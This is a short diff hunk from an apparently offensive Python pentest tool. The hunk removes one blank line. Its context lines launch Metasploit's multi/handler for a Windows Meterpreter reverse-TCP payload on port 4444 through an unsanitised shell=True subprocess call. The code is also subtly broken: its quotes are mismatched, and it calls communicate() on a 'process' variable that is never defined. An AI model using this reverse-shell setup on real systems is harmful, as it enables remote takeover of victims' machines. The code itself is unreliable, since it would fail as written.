@@ -519,7 +519,6 @@ def metasploit_scan():
                 print(f"{key}: {value}")
               exploit_choice = input(Fore.BLUE + "\nEnter the number of the exploit you want to run: ").strip()
               if exploit_choice in exploits:
-                
                 command = f"msfconsole -q -x \"use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost {ip}; set lport 4444; exploit -j'"                                                     
                 subprocess.Popen(command, shell=True)
                 stdout, stderr = process.communicate()
